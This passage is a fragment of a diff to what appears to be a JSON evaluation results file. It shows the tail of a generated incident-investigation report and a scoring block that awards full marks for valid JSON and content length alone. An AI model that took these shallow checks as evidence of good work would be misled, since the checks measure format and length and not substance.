(REDACTED)\n- Appendix D: Regulatory Notification Templates\n\n**INVESTIGATION STATUS:** ACTIVE  \n**NEXT REVIEW DATE:** November 2, 2023",
+        "workflow": null
+      },
+      "scoring": {
+        "score": 25,
+        "maxScore": 25,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Has content (8588 chars)",
+          "✓ Content length: 8588 ≥ 1500"
+        ]
+      }
+    }
+  ]
+}
